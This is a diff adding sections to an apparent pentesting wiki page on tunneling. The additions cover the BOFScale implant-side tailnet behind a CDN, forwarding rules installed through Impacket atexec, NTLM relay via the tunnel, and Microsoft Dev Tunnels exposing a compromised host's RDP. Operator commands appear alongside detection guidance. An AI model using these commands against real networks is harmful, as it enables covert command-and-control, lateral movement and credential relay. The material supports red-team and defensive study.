@@ -236,6 +236,46 @@ rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
 
+## BOFScale - CDN-fronted in-process tailnet
+
+[BOFScale](https://github.com/NetSPI/BOFscale) runs a modified Tailscale overlay inside a Windows C2 implant without installing a TUN driver or service. Its three components are an asynchronous CGo `c-shared` `tailscaled` BOF-PE, a small C++ BOF-PE that speaks the local API, and an asynchronous `socksportfwd` TCP-to-SOCKS5 bridge.<sup>[[53]](#references)[[54]](#references)</sup>
+
+### CDN-compatible TS2021 and DERP
+
+Tailscale normally uses proprietary HTTP upgrades for the Noise-based TS2021 control channel and DERP relay. BOFScale keeps those byte streams but carries them in RFC 6455 WebSockets, using `Sec-WebSocket-Protocol: ts2021` or `derp`, so an operator-controlled Headscale/DERP origin can sit behind a CDN that only accepts standard WebSocket upgrades. The patched client retries TS2021 over WebSockets after HTTP `500`, retries DERP after HTTP `426`, and makes the DERP WebSocket dialer honor the host proxy configuration; the BOF sets `TS_DEBUG_DERP_WS_CLIENT=1` to skip the known-to-fail first attempt.<sup>[[53]](#references)[[54]](#references)</sup>
+
+The CDN and origin proxy must preserve WebSocket upgrades for `/ts2021` and `/derp`, forward `/key` as ordinary HTTP, and disable internal read/write timeouts because relay sessions can remain open indefinitely. The supplied Headscale configuration enables `verify_clients`, publishes only the operator's embedded DERP map, and leaves `derp.urls` empty to prevent fallback to Tailscale-operated relays.<sup>[[53]](#references)[[54]](#references)</sup>
+
+### In-process daemon and named-pipe control
+
+Unless overridden, the BOF entry point starts `tailscaled` with `-tun=userspace-networking`, `-state mem:`, and `-no-logs-no-support`, then creates a UUID-named pipe. It redirects Go stdout/stderr through an OS pipe to the Beacon output API, so the complete daemon and Go runtime remain resident but state and logs are not written to a Tailscale directory.<sup>[[53]](#references)[[54]](#references)</sup>
+
+The lightweight client reproduces Tailscale's HTTP/1.0 local API over that pipe. It opens the pipe with `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` because the daemon's `safesocket` layer impersonates the pipe client, sends `Tailscale-Cap: 125`, and maps the local API to `up`, `down`, `status`, route advertisement, and shutdown operations.<sup>[[53]](#references)[[54]](#references)</sup>
+
+> [!WARNING]
+> Do not unload a manually mapped Go BOF-PE after asking the daemon to shut down: runtime and garbage-collector goroutines can continue executing from memory that the loader unmaps. Run `tailscaled` in a sacrificial process and terminate that process for final cleanup.<sup>[[54]](#references)</sup>
+
+### Bridge host-originated traffic through userspace SOCKS5
+
+Inbound tailnet connections and advertised subnet routes work inside the userspace network stack, but normal processes on the compromised host have no OS route into the overlay. `socksportfwd` therefore listens on a victim-facing TCP port, negotiates SOCKS5 `NO AUTH` with the daemon's `0.0.0.0:1080` listener, issues `CONNECT` for a tailnet destination, and relays both directions asynchronously. When the target is a MagicDNS name it uses `ATYP_DOMAIN`, making `tailscaled` resolve the name without exposing it to the Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>
+
+A minimal operator flow is shown below; both the operator node and implant must use the patched binaries because stock Tailscale cannot traverse this CDN design.<sup>[[53]](#references)[[54]](#references)</sup>
+
+```bash
+HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
+# Start tailscaled as an asynchronous BOF and copy its printed pipe name
+tailscaled
+tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
+tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
+socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
+```
+
+The local forward can separate the apparent authentication listener from the relay tool: coerce a machine to authenticate to the compromised host's bound port, forward it through the tailnet to `ntlmrelayx`, and relay onward to AD CS, LDAP, HTTP, SMB, or another compatible target. See [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) and [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) for the vulnerability-specific stages; BOFScale is only the transport.<sup>[[54]](#references)</sup>
+
+### Detection
+
+Hunt for the combination rather than a single weak indicator: a Go runtime in a process that is not normally Go-based, a UUID pipe with permissive SDDL `D:(A;;GA;;;WD)`, an unexpected `0.0.0.0:1080` SOCKS listener, and long-lived TLS WebSockets to CDN addresses. With TLS inspection, flag `Sec-WebSocket-Protocol: derp` or `ts2021` when the owning process is not an authorized `tailscaled` service. The repository's `bofscale.yar` rules provide memory signatures for all three BOF-PE components.<sup>[[53]](#references)[[54]](#references)</sup>
+
 ## reGeorg
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
@@ -490,6 +530,17 @@ netsh interface portproxy show v4tov4
 netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 
+### Deploying `portproxy` through a scheduled task
+
+When administrative credentials are available, remote Task Scheduler execution can install a native forwarding rule without uploading a dedicated relay. For example, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) can make a pivot listen on TCP/443 and relay the connection to an internal SMB service.<sup>[[57]](#references)[[58]](#references)</sup>
+
+```bash
+atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
+  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
+```
+
+The rule is persistent, so enumerate it with `netsh interface portproxy show v4tov4` and remove it explicitly after testing. Remember that `portproxy` provides forwarding only; the host firewall must also permit the listening port.<sup>[[24]](#references)</sup>
+
 ## SocksOverRDP & Proxifier
 
 You need to have **RDP access over the system**.\
@@ -522,6 +573,10 @@ netstat -antb | findstr 1080
 ```
 
 Now you can use [**Proxifier**](https://www.proxifier.com/) to proxy the traffic through that port.<sup>[[26]](#references)</sup>
+
+### RDP virtual-channel hunting
+
+[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) is another RDP virtual-channel tunnel; its default channel name is `rdp2tcp`, although an operator can select a different name.<sup>[[56]](#references)</sup> Channel creation and closure are recorded in `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` as event IDs **132** and **148**. Hunt for `rdp2tcp` and rare/random channel names, then compare them with expected channels such as `XPSRD`, `cliprdr`, and `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>
 
 ## Proxify Windows GUI Apps
 
@@ -765,6 +820,25 @@ tunnels:
     addr: file:///tmp/httpbin/
 ```
 
+## Microsoft Dev Tunnels
+
+Microsoft Dev Tunnels can publish a local TCP-backed service through Microsoft relay infrastructure. The host CLI creates an outbound tunnel, while `devtunnel connect` recreates the hosted port on the client; tunnels require authentication by default unless access controls are deliberately relaxed.<sup>[[55]](#references)[[58]](#references)</sup>
+
+```bash
+# Compromised/pivot host: publish its local RDP service
+# Save the tunnel ID printed by this command
+devtunnel host -p 3389
+
+# Operator host: authenticate as an authorized tunnel user and create
+# a local 127.0.0.1:3389 forward to the hosted port
+devtunnel connect <TUNNEL_ID>
+xfreerdp /u:<USER> /v:127.0.0.1:3389
+```
+
+This can expose RDP through `*.devtunnels.ms` without opening a new inbound listener on the perimeter. It can also be layered with an RDP virtual-channel tunnel such as `rdp2tcp`, turning the RDP session into a second-stage pivot for arbitrary TCP traffic.<sup>[[58]](#references)</sup>
+
+For hunting, correlate execution of the Dev Tunnels CLI with DNS/TLS traffic to `*.devtunnels.ms` and unexpected RDP virtual-channel events. An authenticated tunnel is not benign merely because it uses a Microsoft-owned relay.<sup>[[58]](#references)</sup>
+
 ## Cloudflared (Cloudflare Tunnel)
 
 Cloudflare Tunnel's `cloudflared` connector establishes outbound connections; published applications can route HTTP, HTTPS, TCP, SSH, and RDP, while quick tunnels are intended for HTTP development.<sup>[[43]](#references)[[45]](#references)</sup>
@@ -988,5 +1062,11 @@ The same report details the defaults, wildcard listeners, packet decryption, rel
 - [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
 - [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
 - [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
+- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
+- [54] [BOFScale: A CDN-Fronted Tailnet from a BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
+- [55] [Microsoft Learn - Dev Tunnels CLI commands](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
+- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
+- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
+- [58] [NightEagle APT: GhostContainer and Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
 
 {{#include ../banners/hacktricks-training.md}}
